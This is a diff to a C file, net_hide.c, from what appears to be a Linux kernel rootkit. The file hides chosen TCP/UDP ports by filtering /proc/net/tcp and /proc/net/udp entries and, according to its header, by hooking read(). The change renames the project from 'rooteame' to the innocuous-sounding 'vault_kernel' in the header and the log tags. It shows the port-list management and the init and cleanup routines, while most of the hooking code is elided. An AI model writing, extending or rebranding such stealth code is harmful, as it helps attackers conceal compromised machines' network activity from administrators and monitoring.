@@ -1,4 +1,4 @@
-/* rooteame - net_hide.c
+/* vault_kernel - net_hide.c
  * Network connection hiding via /proc/net/tcp*, /proc/net/udp* filtering
  * Also hooks read() to filter content from these proc files
  * ruby570bocadito © 2026
@@ -22,7 +22,7 @@ void net_hide_add_port(uint16_t port) {
     if (hidden_port_count < MAX_HIDDEN_PORTS) {
         hidden_ports[hidden_port_count] = htons(port);
         hidden_port_count++;
-        pr_info(ROOTEAME_TAG " hiding port: %d\n", port);
+        pr_info(VAULT_KERNEL_TAG " hiding port: %d\n", port);
     }
     spin_unlock_irqrestore(&net_hide_lock, flags);
 }
@@ -37,7 +37,7 @@ void net_hide_del_port(uint16_t port) {
             hidden_port_count--;
             memmove(&hidden_ports[i], &hidden_ports[i+1],
                     (hidden_port_count - i) * sizeof(uint16_t));
-            pr_info(ROOTEAME_TAG " unhid port: %d\n", port);
+            pr_info(VAULT_KERNEL_TAG " unhid port: %d\n", port);
             break;
         }
     }
@@ -189,7 +189,7 @@ int net_hide_init(void) {
     proc_net_udp_ino  = get_proc_inode("/proc/net/udp");
     proc_net_udp6_ino = get_proc_inode("/proc/net/udp6");
 
-    pr_info(ROOTEAME_TAG " network hiding initialized — "
+    pr_info(VAULT_KERNEL_TAG " network hiding initialized — "
             "tcp=%lu tcp6=%lu udp=%lu udp6=%lu\n",
             proc_net_tcp_ino, proc_net_tcp6_ino,
             proc_net_udp_ino, proc_net_udp6_ino);
@@ -198,5 +198,5 @@ int net_hide_init(void) {
 
 void net_hide_cleanup(void) {
     hidden_port_count = 0;
-    pr_info(ROOTEAME_TAG " network hiding cleaned\n");
+    pr_info(VAULT_KERNEL_TAG " network hiding cleaned\n");
 }
